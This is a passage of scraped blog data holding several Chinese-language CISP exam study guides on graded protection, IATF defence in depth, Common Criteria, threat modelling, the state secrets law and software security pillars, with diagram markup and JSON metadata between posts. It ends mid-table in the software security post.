《关于加强政府信息系统安全和保密管理工作的通知》 国务院办公厅 政府信息系统安全管理 专项文件 《中华人民共和国计算机信息系统安全保护条例》 国务院 计算机信息系统安全保护 行政法规 《关于开展信息安全风险评估工作的意见》 相关部门 风险评估工作指导 专项文件 《国家信息化领导小组关于加强信息安全保障工作的意见》的重要性： graph TB A[\"中办发[2003]27号文件\"] B[\"信息安全保障工作方针\"] C[\"总体要求\"] D[\"主要原则\"] E[\"重点任务\"] A --> B A --> C A --> D A --> E B --> B1[\"积极防御\"] B --> B2[\"综合防范\"] C --> C1[\"提高整体水平\"] C --> C2[\"保障重点系统\"] D --> D1[\"坚持积极防御\"] D --> D2[\"坚持管理与技术并重\"] D --> D3[\"坚持突出重点\"] E --> E1[\"等级保护制度\"] E --> E2[\"风险评估\"] E --> E3[\"应急响应\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#fce4ec,stroke:#c2185b 文件核心内容： 信息安全保障工作方针 积极防御 综合防范 确保重点 总体要求 提高信息安全保障能力 保障重要信息系统安全 维护国家安全和社会稳定 主要原则 坚持积极防御、综合防范 坚持管理与技术并重 坚持突出重点、保障重点 坚持统筹规划、分步实施 重点任务 建立信息安全等级保护制度 开展信息安全风险评估 建立应急响应机制 加强信息安全教育培训 二、信息安全等级保护制度 2.1 等级保护概述 信息安全等级保护是我国的一项基础制度，具有一定强制性，其实施的主要目的是有效地提高我国信息和信息系统安全建设的整体水平，重点保障基础信息网络和重要信息系统的安全。 graph TB A[\"信息安全等级保护\"] B[\"定级\"] C[\"备案\"] D[\"建设整改\"] E[\"等级测评\"] F[\"监督检查\"] A --> B B --> C C --> D D --> E E --> F F --> D B --> B1[\"确定保护等级\"] C --> C1[\"向公安机关备案\"] D --> D1[\"按等级要求建设\"] E --> E1[\"第三方测评\"] F --> F1[\"主管部门检查\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#fce4ec,stroke:#c2185b style F fill:#e1f5fe,stroke:#0277bd 💡 等级保护的特点基础性制度： 作为我国信息安全的基础制度 具有一定的强制性 适用于各类信息系统 主要目的： 提高信息系统安全建设整体水平 重点保障基础信息网络 保护重要信息系统安全 2.2 等级保护五个等级 我国信息安全等级保护将信息系统分为五个安全保护等级： graph TB A[\"等级保护五级体系\"] B[\"第一级用户自主保护级\"] C[\"第二级系统审计保护级\"] D[\"第三级安全标记保护级\"] E[\"第四级结构化保护级\"] F[\"第五级访问验证保护级\"] A --> B A --> C A --> D A --> E A --> F B --> B1[\"自主定级自主保护备案\"] C --> C1[\"自主定级自主保护备案\"] D --> D1[\"主管部门审核测评检查\"] E --> E1[\"主管部门审核强制测评\"] F --> F1[\"国家专控最高等级\"] style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffe0b2,stroke:#e65100 style E fill:#ffcdd2,stroke:#c62828 style F fill:#f3e5f5,stroke:#4a148c 各等级详细说明： 等级 名称 破坏后果 管理要求 第一级 用户自主保护级 损害公民、法人和其他组织的合法权益，但不损害国家安全、社会秩序和公共利益 自主定级、自主保护、备案 第二级 系统审计保护级 严重损害公民、法人和其他组织的合法权益，或者损害社会秩序和公共利益，但不损害国家安全 自主定级、自主保护、备案 第三级 安全标记保护级 严重损害社会秩序和公共利益，或者损害国家安全 主管部门审核、测评、检查 第四级 结构化保护级 特别严重损害社会秩序和公共利益，或者严重损害国家安全 主管部门审核、强制测评 第五级 访问验证保护级 特别严重损害国家安全 国家专门控制 2.3 等级保护测评体系 🔍 测评体系管理根据相关文件规定，由公安部等级保护评估中心对等级保护测评机构管理，接受测评机构的申请、考核和定期能力验证，对不具备能力的测评机构则取消授权。 测评体系关键要素： graph TB A[\"等级保护测评体系\"] B[\"管理机构\"] C[\"测评机构\"] D[\"管理流程\"] A --> B A --> C A --> D B --> B1[\"公安部等级保护评估中心\"] C --> C1[\"申请资质\"] C --> C2[\"接受考核\"] C --> C3[\"定期能力验证\"] D --> D1[\"申请\"] D --> D2[\"考核\"] D --> D3[\"能力验证\"] D --> D4[\"取消授权\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 测评体系管理流程： 阶段 内容 负责机构 说明 申请 测评机构提交申请 测评机构 需满足资质要求 考核 对测评机构进行考核 公安部等级保护评估中心 评估能力和资质 能力验证 定期验证测评能力 公安部等级保护评估中心 确保持续符合要求 取消授权 对不具备能力的机构取消授权 公安部等级保护评估中心 保证测评质量 2.4 二级系统的特点 💡 二级系统管理特点自主性强： 自主定级：系统运营使用单位自行确定等级 自主保护：按照要求自行建设和保护 备案制：向公安机关备案即可 无需上级测评： 不需要上级或主管部门测评 不需要主管部门检查 但需要向公安机关备案 2.5 等级保护与其他标准的区别 常见信息安全标准对比： 标准/制度 性质 强制性 适用范围 主要目的 信息安全等级保护 国家基础制度 有一定强制性 中国境内信息系统 提高整体安全水平 ISMS (ISO 27001) 国际标准 自愿认证 全球 建立管理体系 NIST SP800 技术指南 美国联邦机构强制 主要美国 提供技术指导 ISO 27000系列 国际标准 自愿认证 全球 信息安全管理 三、信息安全保障技术框架（IATF） 3.1 IATF概述 信息安全保障技术框架（Information Assurance Technical Framework, IATF）是美国国家安全局（NSA）制定的框架，目的是为保障政府和工业的信息基础设施提供技术指南。 graph TB A[\"IATF框架\"] B[\"深度防御战略\"] C[\"纵深防御\"] D[\"安全服务\"] A --> B A --> C A --> D B --> B1[\"人员\"] B --> B2[\"技术\"] B --> B3[\"运行/操作\"] C --> C1[\"保护网络和基础设施\"] C --> C2[\"保护边界\"] C --> C3[\"保护计算环境\"] C --> C4[\"支撑性基础设施\"] D --> D1[\"认证\"] D --> D2[\"访问控制\"] D --> D3[\"完整性\"] D --> D4[\"保密性\"] D --> D5[\"可用性\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 3.2 IATF的核心思想：深度防御 深度防御（Defense in Depth）是IATF的核心思想，强调多层次、多维度的安全防护。 💡 深度防御的核心理念多层防护： 不依赖单一防护措施 建立多道防线 即使一层被突破，其他层仍能保护 全方位防护： 从人员、技术、运行三个维度 覆盖网络、边界、计算环境 提供全面的安全保障 3.3 深度防御的三个核心要素 深度防御战略包含三个核心要素： graph LR A[\"深度防御三要素\"] B[\"人员People\"] C[\"技术Technology\"] D[\"运行/操作Operations\"] A --> B A --> C A --> D B --> B1[\"安全意识\"] B --> B2[\"培训教育\"] B --> B3[\"职责分工\"] C --> C1[\"安全技术\"] C --> C2[\"安全产品\"] C --> C3[\"安全工具\"] D --> D1[\"安全流程\"] D --> D2[\"安全策略\"] D --> D3[\"日常运维\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 三要素详解： 要素 说明 关键内容 人员（People） 安全的人为因素 安全意识、培训、职责、文化 技术（Technology） 安全的技术手段 防火墙、加密、认证、检测 运行/操作（Operations） 安全的管理运营 策略、流程、监控、响应 ⚠️ 三要素缺一不可 只有技术没有人员意识，安全措施会被绕过 只有人员没有技术支撑，无法有效防护 只有技术和人员没有运行管理，无法持续保障 3.4 IATF的纵深防御层次 纵深防御的四个层次： graph TB A[\"纵深防御层次\"] B[\"保护网络和基础设施\"] C[\"保护边界\"] D[\"保护计算环境\"] E[\"支撑性基础设施\"] A --> B A --> C A --> D A --> E B --> B1[\"网络架构安全\"] B --> B2[\"网络设备安全\"] C --> C1[\"防火墙\"] C --> C2[\"入侵检测\"] D --> D1[\"主机安全\"] D --> D2[\"应用安全\"] E --> E1[\"物理安全\"] E --> E2[\"人员安全\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 四、安全培训管理 4.1 安全培训的重要性 安全培训是提升组织整体安全水平的关键手段，需要针对不同人员制定不同的培训计划。 graph TB A[\"安全培训体系\"] B[\"高层管理者\"] C[\"安全管理人员\"] D[\"技术人员\"] E[\"全体员工\"] A --> B A --> C A --> D A --> E B --> B1[\"网络安全法\"] B --> B2[\"战略决策\"] B --> B3[\"合规要求\"] C --> C1[\"CISP认证\"] C --> C2[\"专业技能\"] C --> C3[\"管理能力\"] D --> D1[\"安全基础\"] D --> D2[\"技术实践\"] D --> D3[\"安全开发\"] E --> E1[\"安全意识\"] E --> E2[\"基础知识\"] E --> E3[\"日常规范\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 4.2 分层培训策略 不同层级的培训重点： 人员层级 培训内容 培训目标 培训方式 高层管理者（一把手） 网络安全法、战略决策 提升安全意识和重视程度 专题讲座、高层研讨 安全管理人员 CISP认证、专业技能 确保专业能力 认证培训、专业课程 技术人员 安全基础、技术实践 掌握安全技术 技术培训、实操演练 全体员工 安全意识、基础知识 全员安全意识 在线学习、定期宣传 4.3 培训计划制定 💡 有效的培训计划全面覆盖： 从高层到基层全覆盖 不同层级不同内容 确保培训针对性 重点突出： 高层重视网络安全法 管理人员重视专业能力 技术人员重视实践技能 全员重视安全意识 4.4 培训效果评估 培训效果评估方法： 培训效果评估： ├── 反应层评估 │ ├── 培训满意度调查 │ └── 即时反馈收集 ├── 学习层评估 │ ├── 知识测试 │ └── 技能考核 ├── 行为层评估 │ ├── 工作行为观察 │ └── 安全实践检查 └── 结果层评估 ├── 安全事件减少 └── 合规性提升 五、通用准则（CC标准） 5.1 CC标准概述 通用准则（Common Criteria, CC）是目前系统安全认证方面最权威的国际标准，全称为《信息技术安全评估通用准则》。 graph TB A[\"CC标准\"] B[\"结构开放性\"] C[\"表达通用性\"] D[\"独立性\"] A --> B A --> C A --> D B --> B1[\"保护轮廓PP\"] B --> B2[\"安全目标ST\"] B --> B3[\"可扩展\"] C --> C1[\"通用表达方式\"] C --> C2[\"标准化描述\"] D --> D1[\"功能与保证分离\"] D --> D2[\"独立评估\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 5.2 CC标准的先进性 💡 CC标准的三大先进特性1. 结构的开放性： 功能和保证要求可在具体的&quot;保护轮廓&quot;（PP）中细化 可在&quot;安全目标&quot;（ST）中进一步扩展 支持灵活的安全需求定义 2. 表达方式的通用性： 提供通用的表达方式 便于不同产品和系统的安全描述 促进国际间的互认 3. 独立性： 强调将安全的功能和保证分离 功能要求：系统应该做什么 保证要求：如何确保系统正确实现功能 CC标准特性对比： 特性 说明 体现方式 是否为先进性 结构开放性 功能和保证要求可细化扩展 PP和ST ✅ 是 表达通用性 通用的表达方式 标准化描述 ✅ 是 独立性 功能与保证分离 分离评估 ✅ 是 实用性 应用到开发、测试过程 实施指导 ❌ 不是先进性体现 ⚠️ 注意区分实用性不是CC标准先进性的体现： 实用性是指将CC标准应用到实际的IT产品开发、生产、测试和评估过程中 这是标准的应用层面，不是标准本身的先进性特征 CC标准的先进性主要体现在其设计理念和框架结构上 5.3 CC标准核心概念 保护轮廓（PP）与安全目标（ST）： graph LR A[\"CC标准核心概念\"] B[\"保护轮廓PP\"] C[\"安全目标ST\"] A --> B A --> C B --> B1[\"通用安全需求\"] B --> B2[\"某类产品\"] B --> B3[\"可重用\"] C --> C1[\"具体产品\"] C --> C2[\"实现声明\"] C --> C3[\"评估依据\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d 六、总结 🎯 关键要点等级保护制度： 信息安全等级保护是我国的基础制度，有一定强制性 二级系统只需自主定级、自主保护、向公安机关备案 五个等级：用户自主、系统审计、安全标记、结构化、访问验证 IATF框架： IATF的核心思想是深度防御 深度防御的三个核心要素：人员、技术和运行（操作） 纵深防御四层次：网络基础设施、边界、计算环境、支撑设施 安全培训： 安全培训应针对不同层级制定不同内容 高层管理者应重点培训网络安全法 技术人员需掌握安全技术实践 CC标准： CC标准的先进性体现在结构开放性、表达通用性、独立性 实用性不是CC标准先进性的体现 PP（保护轮廓）和ST（安全目标）是核心概念 💡 实践建议 准确定级，合规建设 建立深度防御体系 重视人员、技术、运行三要素 制定全面的培训计划 定期评估培训效果 下一篇： CISP学习指南：信息安全管理体系与标准","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：保密法与威胁建模","slug":"2025/10/CISP-Security-Law-and-Threat-Modeling-zh-CN","date":"un11fin11","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Security-Law-and-Threat-Modeling/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Security-Law-and-Threat-Modeling/","excerpt":"深入解析防火墙隔离、应急响应预案、威胁建模和保密法的核心知识点。","text":"一、防火墙隔离能力 1.1 物理隔离vs逻辑隔离 防火墙在内外网隔离方面的能力有明确的界限。 💡 防火墙隔离能力防火墙的隔离能力： ❌ 不能物理隔离 ✅ 能够逻辑隔离 原因： 物理隔离需要物理断开连接 防火墙通过规则实现逻辑隔离 数据仍然通过防火墙传输 graph LR A[\"隔离方式\"] B[\"物理隔离\"] C[\"逻辑隔离\"] A --> B A --> C B --> B1[\"物理断开\"] B --> B2[\"网闸\"] B --> B3[\"防火墙不能实现\"] C --> C1[\"访问控制规则\"] C --> C2[\"防火墙\"] C --> C3[\"VLAN\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d 隔离方式对比： 隔离方式 实现方法 安全级别 防火墙能否实现 物理隔离 物理断开连接 最高 ❌ 不能 逻辑隔离 访问控制规则 较高 ✅ 能 二、应急响应预案 2.1 应急响应预案的重要性 编制信息安全应急响应预案对组织具有重要意义。 ⚠️ 注意区分应急预案的正确理由： ✅ 明确应急响应指挥体系和工作机制 ✅ 提高应对突发事件能力，减少损失 ✅ 保障信息系统运行平稳、安全、有序、高效 ✅ 保障单位业务系统信息安全 不适合的理由： ❌ 编制应急预案是国家网络安全对所有单位的强制要求 实际上不是所有单位的强制要求 2.2 应急预案的价值 应急预案的四大价值： 价值 说明 体现 组织保障 明确指挥体系和工作机制 职责清晰 能力提升 提高应对突发事件能力 快速响应 损失控制 减少突发事件造成的损失和危害 降低影响 业务保障 保障信息系统运行平稳安全 业务连续 三、威胁建模 3.1 威胁建模流程 威胁建模是识别和评估系统安全威胁的系统化方法。 graph TB A[\"威胁建模流程\"] B[\"1. 确定建模对象\"] C[\"2. 识别威胁\"] D[\"3. 评估威胁\"] E[\"4. 消减威胁\"] A --> B B --> C C --> D D --> E B --> B1[\"确定系统边界\"] B --> B2[\"识别资产\"] C --> C1[\"发现威胁\"] C --> C2[\"使用STRIDE等模型\"] D --> D1[\"分析威胁\"] D --> D2[\"评估概率和影响\"] D --> D3[\"计算风险\"] E --> E1[\"重新设计\"] E --> E2[\"技术措施\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 3.2 威胁识别的正确理解 ⚠️ 常见错误错误理解： ❌ 威胁就是漏洞 这是对威胁的错误理解 正确理解： ✅ 威胁是可能对资产造成损害的潜在原因 ✅ 漏洞是系统的弱点 ✅ 威胁利用漏洞对资产造成损害 ✅ 威胁可能是恶意的，也可能是非恶意的 威胁、漏洞、风险的关系： 安全要素关系： 威胁（Threat） ↓ 利用 漏洞（Vulnerability） ↓ 影响 资产（Asset） ↓ 产生 风险（Risk） 3.3 威胁建模各阶段详解 威胁建模四个步骤： 步骤 名称 主要活动 输出 1 确定建模对象 确定系统边界、识别资产 系统模型 2 识别威胁 发现组件或进程存在的威胁 威胁列表 3 评估威胁 分析威胁，评估概率和影响 风险评级 4 消减威胁 确定消减措施和技术手段 安全方案 四、保密法与国家秘密保护 4.1 危害国家秘密安全的行为 根据《保守国家秘密法》规定，危害国家秘密安全的行为包括四大类。 危害国家秘密安全的四大类行为： graph TB A[\"危害国家秘密安全的行为\"] B[\"严重违反保密规定行为\"] C[\"定密不当行为\"] D[\"网络运营商及服务商不履行保密义务\"] E[\"保密行政管理部门工作人员违法行为\"] A --> B A --> C A --> D A --> E B --> B1[\"泄露国家秘密\"] B --> B2[\"非法获取国家秘密\"] B --> B3[\"非法持有国家秘密\"] C --> C1[\"应定密而不定密\"] C --> C2[\"定密过高或过低\"] C --> C3[\"擅自改变密级\"] D --> D1[\"不采取保密措施\"] D --> D2[\"泄露国家秘密\"] D --> D3[\"不配合保密检查\"] E --> E1[\"滥用职权\"] E --> E2[\"玩忽职守\"] E --> E3[\"徇私舞弊\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e3f2fd,stroke:#1976d2 style E fill:#f3e5f5,stroke:#7b1fa2 4.2 严重违反保密规定行为 🚫 严重违反保密规定的行为主要表现： 📋 泄露国家秘密 故意或过失泄露国家秘密 通过各种方式传播国家秘密 在不应知悉的人员中扩散国家秘密 🔓 非法获取国家秘密 窃取、刺探、收买国家秘密 利用职务便利非法获取 通过技术手段非法获取 📦 非法持有国家秘密 未经批准持有国家秘密载体 私自留存国家秘密文件 非法复制国家秘密 严重违反保密规定行为示例： 行为类型 具体表现 法律后果 泄露国家秘密 在公共场所谈论国家秘密 行政处分、刑事责任 非法获取 窃取涉密文件 刑事责任 非法持有 私自留存涉密文件 行政处分 违规使用 在非涉密计算机处理涉密信息 行政处分 违规存储 在互联网上存储国家秘密 行政处分、刑事责任 4.3 定密不当行为 ⚠️ 定密不当的表现主要类型： ❌ 应定密而不定密 对应当定为国家秘密的事项不定密 导致国家秘密失去保护 可能造成国家秘密泄露 ⬆️ 定密过高 将不应定为国家秘密的定为国家秘密 将密级定得过高 造成资源浪费和工作不便 ⬇️ 定密过低 将密级定得过低 不能有效保护国家秘密 可能导致国家秘密泄露 🔄 擅自改变密级 未经批准擅自提高或降低密级 擅自延长或缩短保密期限 擅自解除密级 4.4 网络运营商及服务商的保密义务 🌐 网络运营商及服务商的保密义务主要义务： 🔒 采取保密措施 建立健全保密管理制度 采取技术保密措施 防止国家秘密泄露 🚫 不得泄露国家秘密 不得故意或过失泄露 不得非法获取、持有、提供 发现泄密应及时报告 ✅ 配合保密检查 接受保密行政管理部门检查 提供必要的协助 及时整改发现的问题 4.5 保密行政管理部门工作人员的违法行为 👮 保密行政管理部门工作人员的违法行为主要类型： ⚖️ 滥用职权 超越职权范围行使权力 违反法定程序 侵害公民、法人合法权益 😴 玩忽职守 不履行或不正确履行职责 疏于管理和监督 造成国家秘密泄露 🤝 徇私舞弊 为谋取私利而违法 包庇违法行为 泄露国家秘密 4.6 法律责任 危害国家秘密安全行为的法律责任： graph TB A[\"法律责任\"] B[\"行政责任\"] C[\"刑事责任\"] D[\"民事责任\"] A --> B A --> C A --> D B --> B1[\"警告\"] B --> B2[\"记过\"] B --> B3[\"降级\"] B --> B4[\"撤职\"] B --> B5[\"开除\"] C --> C1[\"故意泄露国家秘密罪\"] C --> C2[\"过失泄露国家秘密罪\"] C --> C3[\"非法获取国家秘密罪\"] D --> D1[\"赔偿损失\"] style B fill:#fff3e0,stroke:#f57c00 style C fill:#ffcdd2,stroke:#c62828 style D fill:#e3f2fd,stroke:#1976d2 法律责任对比： 责任类型 适用情形 处罚措施 法律依据 行政责任 一般违反保密规定 警告、记过、降级、撤职、开除 《保守国家秘密法》 刑事责任 构成犯罪 有期徒刑、拘役、管制 《刑法》 民事责任 造成损失 赔偿损失 《民法典》 4.7 保密法的核心制度 保密法的核心制度： 保密法核心制度： ├── 定密制度 │ ├── 定密权限 │ ├── 定密程序 │ └── 密级标志 ├── 保密期限制度 │ ├── 绝密级：不超过30年 │ ├── 机密级：不超过20年 │ └── 秘密级：不超过10年 ├── 解密制度 │ ├── 自动解密 │ ├── 提前解密 │ └── 延期解密 ├── 保密审查制度 │ ├── 涉密人员审查 │ ├── 涉密载体审查 │ └── 信息公开审查 └── 监督检查制度 ├── 日常检查 ├── 专项检查 └── 责任追究 4.8 保密工作的基本原则 💡 保密工作基本原则保密工作应当坚持的原则： 1️⃣ 积极防范、突出重点、依法管理 主动采取措施防范泄密 重点保护核心秘密 依法开展保密工作 2️⃣ 既确保国家秘密安全，又便利信息资源合理利用 平衡保密与公开 促进信息共享 提高工作效率 保密工作的实施要点： 要点 内容 目的 积极防范 主动采取保密措施 防患于未然 突出重点 重点保护核心秘密 确保重点安全 依法管理 依法开展保密工作 规范保密管理 合理利用 促进信息资源利用 提高工作效率 五、系列总结 信息安全等级保护与框架的核心要点回顾： 5.1 等级保护基础 等级保护制度：我国基础性制度，具有一定强制性 五个等级：用户自主、系统审计、安全标记、结构化、访问验证 IATF框架：深度防御战略，人员、技术、运行三要素 安全培训：分层培训，全员覆盖 CC标准：结构开放性、表达通用性、独立性 5.2 管理体系与标准 信息安全工程：同步规划、同步建设 ISMS：遵循PDCA模型 等级保护发展：思想提出→试点→政策→标准→法律 P2DR模型：强调控制和对抗、动态性、漏洞监测 5.3 事件与风险管理 信息安全事件：分四级，按影响程度定级 国家秘密定级：由指定部门确定 IPsec协议：提供认证、保密、完整性、防重放保护 密钥管理：不能重用会话密钥 风险处理：降低、规避、转移、接受 5.4 保密法与威胁建模 防火墙隔离：能逻辑隔离，不能物理隔离 应急响应预案：明确指挥体系，提高应对能力 威胁建模：确定对象、识别威胁、评估威胁、消减威胁 保密法：四大类危害行为，三种法律责任 🎯 核心要点总结制度与框架： 等级保护是基础制度，IATF提供技术框架 深度防御强调人员、技术、运行三要素 CC标准体现结构开放性、表达通用性、独立性 管理与工程： 信息安全工程要同步规划、同步建设 ISMS遵循PDCA持续改进 P2DR模型强调动态性和漏洞监测 事件与风险： 事件分级综合考虑影响范围、程度和社会影响 风险处理根据实际情况选择合适方式 密钥管理遵循科克霍夫原则 保密与威胁： 保密法规定四大类危害行为 威胁建模是系统化的安全评估方法 应急预案提高组织应对突发事件能力 💡 实践建议 建立完善的等级保护体系 实施深度防御策略 遵循PDCA持续改进 加强人员安全意识培训 制定科学的风险管理策略 严格遵守保密法律法规 定期开展威胁建模和安全评估 建立健全应急响应机制","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：软件安全","slug":"2025/10/CISP-Software-Security-zh-CN","date":"un00fin00","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Software-Security/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Software-Security/","excerpt":"深入解析CISP认证中的软件安全知识点，涵盖软件安全三大支柱、安全开发生命周期和安全测试方法。","text":"软件安全是信息安全的重要组成部分，通过在软件开发生命周期中融入安全实践，可以从源头上降低安全风险。 一、BSI（Build Security In）系列模型 1.1 BSI的含义 BSI（Build Security In）是指将安全内建到软件过程中，而不是可有可无，更不是游离于软件开发生命周期之外。 BSI的核心理念： graph TB A[\"BSI核心理念\"] B[\"安全内建\"] C[\"全生命周期\"] D[\"工程化方法\"] A --> B A --> C A --> D B --> B1[\"不是可有可无\"] B --> B2[\"不是游离于外\"] B --> B3[\"是有机组成部分\"] C --> C1[\"需求阶段\"] C --> C2[\"设计阶段\"] C --> C3[\"实现阶段\"] C --> C4[\"测试阶段\"] C --> C5[\"运维阶段\"] D --> D1[\"系统化方法\"] D --> D2[\"可重复过程\"] D --> D3[\"最优实践\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 💡 BSI的关键特征BSI强调的核心思想： 🏗️ 安全内建（Built-in） 安全是软件的有机组成部分 不是事后添加的附加功能 从一开始就考虑安全 🔄 全生命周期 贯穿整个软件开发生命周期 不是某个阶段的独立活动 持续的安全保障 🛠️ 工程化方法 使用系统化、工程化的方法 不是临时性的安全措施 可重复、可度量的过程 二、软件安全三大支柱 2.1 软件安全框架 软件安全三大支柱： graph TB A[\"软件安全\"] B[\"应用风险管理Risk Management\"] C[\"软件安全接触点Touchpoints\"] D[\"安全知识Knowledge\"] A --> B A --> C A --> D B --> B1[\"识别和评估风险\"] B --> B2[\"制定缓解策略\"] B --> B3[\"持续监控\"] C --> C1[\"代码审核\"] C --> C2[\"架构风险分析\"] C --> C3[\"渗透测试\"] C --> C4[\"安全测试\"] D --> D1[\"安全原则\"] D --> D2[\"最佳实践\"] D --> D3[\"威胁知识\"] D --> D4[\"漏洞模式\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 🚨 常见错误：安全测试不是三大支柱之一错误说法：软件安全的三根支柱是风险管理、软件安全触点和安全测试 ❌ 为什么这是错误的： 安全测试只是软件安全接触点的一部分 不是独立的支柱 它属于软件安全接触点中的具体实践 ✅ 正确的三大支柱： 应用风险管理（Risk Management） 软件安全接触点（Touchpoints） 安全知识（Knowledge） 💡 软件安全三大支柱详解正确答案：应用风险管理、软件安全接触点和安全知识 1️⃣ 应用风险管理（Risk Management） 识别和评估软件面临的安全风险 制定风险缓解策略 持续监控和管理风险 将安全风险纳入业务决策 2️⃣ 软件安全接触点（Touchpoints） 在软件开发生命周期的关键点应用安全实践 包括代码审核、架构风险分析、渗透测试等 将安全融入开发过程 在不同阶段采用不同的安全活动 3️⃣ 安全知识（Knowledge） 安全原则和最佳实践 威胁和攻击模式知识 常见漏洞和缺陷模式 安全设计模式和反模式 为什么不是其他选项： 选项 说明 为什么不正确 代码审核、风险分析和渗透测试 这些都是软件安全接触点 只是三大支柱之一的具体实践 威胁建模、渗透测试和软件安全接触点 威胁建模和渗透测试是接触点的一部分 缺少应用风险管理和安全知识 威胁建模、代码审核和模糊测试 都是具体的安全活动 只是软件安全接触点的实践方法 2.2 三大支柱的关系 三大支柱如何协同工作： graph LR A[\"安全知识\"] --> B[\"应用风险管理\"] A --> C[\"软件安全接触点\"] B --> D[\"安全软件\"] C --> D B C style A fill:#fff3e0,stroke:#f57c00 style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#c8e6c9,stroke:#2e7d32 💡 三大支柱的协同作用安全知识是基础： 为风险管理提供威胁和漏洞知识 指导安全接触点的实施 帮助团队理解安全重要性 应用风险管理是战略： 确定安全优先级 指导资源分配 平衡安全和业务需求 软件安全接触点是战术： 将安全融入开发过程 在关键点应用安全实践 发现和修复安全问题 三、软件安全接触点 3.1 主要接触点 软件开发生命周期中的安全接触点： graph TB A[\"需求阶段\"] --> A1[\"安全需求分析\"] B[\"设计阶段\"] --> B1[\"架构风险分析\"] B --> B2[\"威胁建模\"] C[\"实现阶段\"] --> C1[\"代码审核\"] C --> C2[\"安全编码\"] D[\"测试阶段\"] --> D1[\"安全测试\"] D --> D2[\"模糊测试\"] D --> D3[\"渗透测试\"] E[\"部署阶段\"] --> E1[\"安全配置\"] E --> E2[\"部署审查\"] F[\"运维阶段\"] --> F1[\"安全监控\"] F --> F2[\"漏洞管理\"] style A fill:#e8eaf6,stroke:#3f51b5 style B fill:#f3e5f5,stroke:#9c27b0 style C fill:#e0f2f1,stroke:#009688 style D fill:#fff3e0,stroke:#ff9800 style E fill:#e8f5e9,stroke:#388e3d style F fill:#fce4ec,stroke:#c2185b 关键接触点详解： 接触点 阶段 主要活动 目标 安全需求分析 需求 识别安全需求、合规要求 明确安全目标 架构风险分析 设计 评估架构安全风险 安全架构设计 威胁建模 设计 识别威胁和攻击面 理解安全威胁 代码审核 实现 审查代码安全问题 发现代码缺陷 安全测试 测试 验证安全控制 确保安全功能 渗透测试 测试 模拟攻击 发现漏洞 3.2 代码审核 代码审核的类型： graph TB A[\"代码审核\"] B[\"静态代码审核\"] C[\"动态代码审核\"] D[\"人工代码审核\"] A --> B A --> C A --> D B --> B1[\"不执行代码\"] B --> B2[\"分析源代码\"] B --> B3[\"自动化工具\"] C --> C1[\"执行代码\"] C --> C2[\"运行时分析\"] C --> C3[\"发现运行时问题\"] D --> D1[\"专家审查\"] D --> D2[\"发现逻辑问题\"] D --> D3[\"最佳实践检查\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 3.3 渗透测试 渗透测试的价值： 💡 渗透测试的作用渗透测试是验证安全性的重要手段： 🎯 模拟真实攻击 从攻击者角度评估系统 发现实际可利用的漏洞 验证安全控制有效性 🔍 发现深层问题 发现设计和实现缺陷 识别配置错误 发现业务逻辑漏洞 📊 提供改进建议 评估风险严重程度 提供修复建议 帮助优先级排序 四、应用风险管理 4.1 风险管理流程 应用风险管理的关键步骤： graph LR A[\"风险识别\"] --> B[\"风险评估\"] B --> C[\"风险处置\"] C --> D[\"风险监控\"] D --> A A --> A1[\"识别威胁和漏洞\"] B --> B1[\"评估可能性和影响\"] C --> C1[\"制定缓解措施\"] D --> D1[\"持续监控\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 风险处置策略： 策略 说明 适用场景 规避 